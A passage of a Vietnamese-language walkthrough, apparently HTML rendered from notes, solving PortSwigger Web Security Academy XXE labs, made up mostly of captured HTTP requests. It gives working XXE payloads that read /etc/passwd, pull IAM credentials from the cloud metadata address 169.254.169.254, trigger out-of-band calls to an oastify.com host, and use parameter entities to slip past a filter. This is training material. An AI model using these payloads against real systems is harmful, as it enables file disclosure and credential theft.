+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a9c00e203ff709f80153570000800f7.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="nx">ext</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="o">&amp;</span><span class="nx">ext</span><span class="p">;&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Quan sát thấy nội dung file trả về. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%203.png" /></p>
+</li>
+</ul>
+<h1 id="lab-exploiting-xxe-to-perform-ssrf-attacks"><strong>Lab: Exploiting XXE to perform SSRF attacks</strong><a class="headerlink" href="#lab-exploiting-xxe-to-perform-ssrf-attacks" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf">Lab: Exploiting XXE to perform SSRF attacks | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng <code>Check stock</code></p>
+<p><img alt="image.png" src="image%204.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> .</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a550055041d87b581a89829001e00c4</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">i6DRFwT71yiySstluE5qLPGn5lOc5URy</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a550055041d87b581a89829001e00c4.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">107</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a550055041d87b581a89829001e00c4.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện thay đổi param <code>productId</code> và nhận thấy thông báo lỗi trả về chứa cả giá trị của <code>productId</code></p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a550055041d87b581a89829001e00c4</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">i6DRFwT71yiySstluE5qLPGn5lOc5URy</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a550055041d87b581a89829001e00c4.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">110</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a550055041d87b581a89829001e00c4.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="nx">aaaa</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Vì đề cho url dịch vụ cloud nên chúng ta có thể thử request đến dịch vụ này bằng payload sau thay vào param <code>productId</code></p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://169.254.169.254/&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện tiếp tục nối path, chúng ta fuzz ra được path sau chứa secret key</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Respone</p>
+<p><img alt="image.png" src="image%207.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%208.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-xxe-with-out-of-band-interaction"><strong>Lab: Blind XXE with out-of-band interaction</strong><a class="headerlink" href="#lab-blind-xxe-with-out-of-band-interaction" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction">Lab: Blind XXE with out-of-band interaction | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng <code>Check stock</code></p>
+<p><img alt="image.png" src="image%209.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> . Thực hiện khai báo thêm một DTD entity như sau:</p>
+<ul>
+<li>
+<p>DTD entity</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://6z6ivbh3ozaxz791zwpao4zqyh48s0ko9.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">afd00d904f613df86cdc07b00f60011</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">FCDispgQzHaeDq8cjitnvEGAwijqfX9B</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0afd00d904f613df86cdc07b00f60011.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">205</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0afd00d904f613df86cdc07b00f60011.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://6z6ivbh3ozaxz791zwpao4zqyh48s0ko9.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="o">&amp;</span><span class="nx">xxe</span><span class="p">;&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request trên đi, quan sát trong Burp collab, nhận thấy trigger thành công dns lookup và http request</p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities"><strong>Lab: Blind XXE with out-of-band interaction via XML parameter entities</strong><a class="headerlink" href="#lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities">Lab: Blind XXE with out-of-band interaction via XML parameter entities | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm. Điều hướng đến chức năng <code>Check stock</code>.</p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> . Tại đây, quan sát thấy rằng phía be đã chặn request chứa dtd entity thông thường</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a2d006204fdef6c80f27b51004d0095</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">c8JMuwr8zBjsTZlAd02sewRENMIawy6H</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a2d006204fdef6c80f27b51004d0095.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">205</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a2d006204fdef6c80f27b51004d0095.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://6z6ivbh3ozaxz791zwpao4zqyh48s0ko9.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="o">&amp;</span><span class="nx">xxe</span><span class="p">;&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, chúng ta vẫn có thể dùng parameter entity như sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://8fokbdx541qzf9p3fy5c46fsejka822qr.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a2d006204fdef6c80f27b51004d0095</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">c8JMuwr8zBjsTZlAd02sewRENMIawy6H</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a2d006204fdef6c80f27b51004d0095.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">208</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a2d006204fdef6c80f27b51004d0095.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
